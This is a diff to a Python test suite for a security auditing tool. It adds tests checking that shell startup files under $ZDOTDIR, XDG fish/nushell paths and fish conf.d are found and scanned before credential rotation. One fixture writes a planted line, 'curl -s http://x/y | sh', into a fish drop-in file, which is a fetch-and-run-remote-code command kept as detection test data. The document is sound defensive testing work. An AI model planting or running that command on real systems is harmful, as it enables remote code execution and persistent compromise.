@@ -6,6 +6,7 @@ whether credential rotation is safe. Exit `3` encodes rotation-unsafe. Offline, 
 from __future__ import annotations
 
 import ast
+import contextlib
 import inspect
 import os
 import tempfile
@@ -24,6 +25,14 @@ from stayawake.bots.security.hygiene.models import (
     ROTATION_UNSAFE_PERSISTENCE, ROTATION_UNSAFE_UNKNOWN)
 from stayawake.cli.commands import audit as audit_cmd
 from stayawake.bots.security.sinks import render as sink_render
+
+
+@contextlib.contextmanager
+def _config_home(home):
+    """Point the XDG/zsh location variables at a fixture home, whatever the ambient environment is."""
+    with mock.patch.dict(os.environ, {"XDG_CONFIG_HOME": str(home / ".config")}):
+        os.environ.pop("ZDOTDIR", None)
+        yield
 
 
 def _issue(id_, severity="warning"):
@@ -301,8 +310,8 @@ class TestTheDisclosureIsNeverAmputated(unittest.TestCase):
         if os.getuid() == 0:
             self.skipTest("root bypasses permission bits")
         locs = []
-        for name in coverage.mechanism._SHELL_RC_FILES:
-            p = d / name.replace("/", "_")
+        for name in sorted({p.name for p in coverage.mechanism.shell_rc_locations()}):
+            p = d / name
             p.mkdir()
             os.chmod(p, 0o000)
             locs.append((coverage._ANCHOR_LABEL, p))
@@ -331,19 +340,74 @@ class TestTheCertifiedSurfaceIsTheScannedSurface(unittest.TestCase):
     it absent while reading it — on a fish-only account, the difference between clean and exit 3."""
 
     def test_every_scanned_shell_startup_file_is_also_certified(self):
-        scanned = set(coverage.mechanism._SHELL_RC_FILES)
         with mock.patch.object(Path, "home", staticmethod(lambda: Path("/h"))):
-            certified = {str(p.relative_to("/h")) for label, p in coverage._must_verify_locations()
+            scanned = set(coverage.mechanism.shell_rc_locations())
+            certified = {p for label, p in coverage._must_verify_locations()
                          if label == coverage._ANCHOR_LABEL}
         self.assertEqual(scanned - certified, set(),
                          "scanned but never certified — the audit would report it absent")
+
+    def test_a_config_kept_outside_home_is_resolved_not_assumed(self):
+        # $ZDOTDIR, XDG fish/nushell, and fish's conf.d drop-in dir: layouts that deliberately keep
+        # $HOME clean, where a fetch-to-shell line runs on every new terminal.
+        home = Path("/h")
+        with mock.patch.dict(os.environ, {"ZDOTDIR": "/z", "XDG_CONFIG_HOME": "/x"}), \
+             mock.patch.object(Path, "home", staticmethod(lambda: home)):
+            found = {str(p) for p in coverage.mechanism.shell_rc_locations()}
+        self.assertIn("/z/.zshrc", found, "$ZDOTDIR is where zsh itself looks")
+        self.assertIn("/x/fish/config.fish", found)
+        self.assertIn("/x/fish/conf.d", found)
+        self.assertIn("/x/nushell/config.nu", found)
+        self.assertIn("/h/.bashrc", found, "bash rc files stay in $HOME")
+
+    def test_it_resolves_on_every_platform_and_survives_an_empty_env_var(self):
+        # An unset var and one set to "" are different values and the same intent; the macOS-only
+        # location must not appear elsewhere; and neither consumer may raise on any platform.
+        for plat in ("darwin", "linux", "win32"):
+            for env in ({}, {"ZDOTDIR": ""}, {"XDG_CONFIG_HOME": ""}):
+                with self.subTest(platform=plat, env=env), \
+                     mock.patch("sys.platform", plat), \
+                     mock.patch.object(Path, "home", staticmethod(lambda: Path("/h"))), \
+                     mock.patch.dict(os.environ, env, clear=False):
+                    for k in ("ZDOTDIR", "XDG_CONFIG_HOME"):
+                        if k not in env:
+                            os.environ.pop(k, None)
+                    found = coverage.mechanism.shell_rc_locations()
+                    coverage.mechanism._iter_shell_rc()
+                    coverage._must_verify_locations()
+                    self.assertIn(Path("/h/.zshrc"), found, "an empty var must fall back to $HOME")
+                    self.assertEqual(any("Application Support" in str(p) for p in found),
+                                     plat == "darwin")
+
+    def test_a_zdotdir_account_is_not_reported_as_having_nothing(self):
+        zdot = Path(tempfile.mkdtemp(prefix="cov-zdot-"))
+        home = Path(tempfile.mkdtemp(prefix="cov-zhome-"))
+        self.addCleanup(lambda: [__import__("shutil").rmtree(d, ignore_errors=True)
+                                 for d in (zdot, home)])
+        (zdot / ".zshrc").write_text("source $ZSH/oh-my-zsh.sh\n")
+        with mock.patch.dict(os.environ, {"ZDOTDIR": str(zdot)}), \
+             mock.patch.object(Path, "home", staticmethod(lambda: home)):
+            self.assertEqual([i.id for i in coverage.check_persistence_coverage()], [])
+
+    def test_a_conf_d_drop_in_is_read_for_a_planted_line(self):
+        home = Path(tempfile.mkdtemp(prefix="cov-confd-"))
+        self.addCleanup(lambda: __import__("shutil").rmtree(home, ignore_errors=True))
+        confd = home / ".config" / "fish" / "conf.d"
+        confd.mkdir(parents=True)
+        (confd / "99-evil.fish").write_text("curl -s http://x/y | sh\n")
+        with _config_home(home), mock.patch.object(Path, "home", staticmethod(lambda: home)):
+            read = [p.name for p in coverage.mechanism._iter_shell_rc()]
+        self.assertIn("99-evil.fish", read, "a conf.d drop-in is sourced on every shell start")
 
     def test_a_fish_only_account_is_not_reported_as_having_nothing(self):
         home = Path(tempfile.mkdtemp(prefix="cov-fish-"))
         self.addCleanup(lambda: __import__("shutil").rmtree(home, ignore_errors=True))
         (home / ".config" / "fish").mkdir(parents=True)
         (home / ".config" / "fish" / "config.fish").write_text("fish_add_path /opt/homebrew/bin\n")
-        with mock.patch.object(Path, "home", staticmethod(lambda: home)):
+        # $XDG_CONFIG_HOME has to be controlled, not inherited: the resolver honours it (correctly —
+        # it is where fish itself looks), and a CI runner sets it to somewhere unrelated to this
+        # fixture, which is how this passed locally and failed on every runner.
+        with _config_home(home), mock.patch.object(Path, "home", staticmethod(lambda: home)):
             self.assertEqual([i.id for i in coverage.check_persistence_coverage()], [])
 
 
